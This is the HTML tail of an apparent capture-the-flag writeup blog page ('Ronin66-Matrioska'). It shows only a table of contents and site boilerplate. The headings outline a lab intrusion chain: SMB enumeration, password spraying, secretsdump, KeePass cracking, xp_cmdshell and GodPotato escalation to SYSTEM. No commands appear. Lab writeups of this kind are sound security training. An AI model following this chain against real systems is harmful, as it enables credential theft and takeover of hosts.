Walk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Layer-2-%E2%80%94-SMB-%E2%86%92-Backup-ZIP-%E2%86%92-Hash"><span class="toc-number">1.4.</span> <span class="toc-text">Layer 2 — SMB → Backup ZIP → Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Share-Enumeration"><span class="toc-number">1.4.1.</span> <span class="toc-text">Share Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RID-Brute-Force-and-Password-Spray"><span class="toc-number">1.4.2.</span> <span class="toc-text">RID Brute Force and Password Spray</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Offline-secretsdump-from-the-Backup-ZIP"><span class="toc-number">1.4.3.</span> <span class="toc-text">Offline secretsdump from the Backup ZIP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Layer-3-%E2%80%94-WinRM-%E2%86%92-KeePass-%E2%86%92-Recycle-Bin"><span class="toc-number">1.5.</span> <span class="toc-text">Layer 3 — WinRM → KeePass → Recycle Bin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM-as-Dean"><span class="toc-number">1.5.1.</span> <span class="toc-text">WinRM as Dean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-Database-kdbx"><span class="toc-number">1.5.2.</span> <span class="toc-text">Cracking Database.kdbx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Recycle-Bin-%E2%80%94-A-Second-Database"><span class="toc-number">1.5.3.</span> <span class="toc-text">Recycle Bin — A Second Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cracking-database2-kdbx-with-john"><span class="toc-number">1.5.4.</span> <span class="toc-text">Cracking database2.kdbx with john</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Layer-4-%E2%80%94-MSSQL-%E2%86%92-xp-cmdshell-%E2%86%92-SYSTEM"><span class="toc-number">1.6.</span> <span class="toc-text">Layer 4 — MSSQL → xp_cmdshell → SYSTEM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Connecting-to-MSSQL"><span class="toc-number">1.6.1.</span> <span class="toc-text">Connecting to MSSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enabling-xp-cmdshell"><span class="toc-number">1.6.2.</span> <span class="toc-text">Enabling xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GodPotato-%E2%86%92-SYSTEM"><span class="toc-number">1.6.3.</span> <span class="toc-text">GodPotato → SYSTEM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.7.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-Used"><span class="toc-number">1.8.</span> <span class="toc-text">Tools Used</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&text=Ronin66-Matrioska"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&is_video=false&description=Ronin66-Matrioska"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ronin66-Matrioska&body=Check out this article: https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&title=Ronin66-Matrioska"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&name=Ronin66-Matrioska&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/09/18/Ronin66-Matrioska/&t=Ronin66-Matrioska"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="panosoikogr" data-description="Support me on Buy me a coffee!" data-message="Thanks for stopping by! If you’d like to support my work, feel free to treat me to a coffee." data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+</body>
+</html>
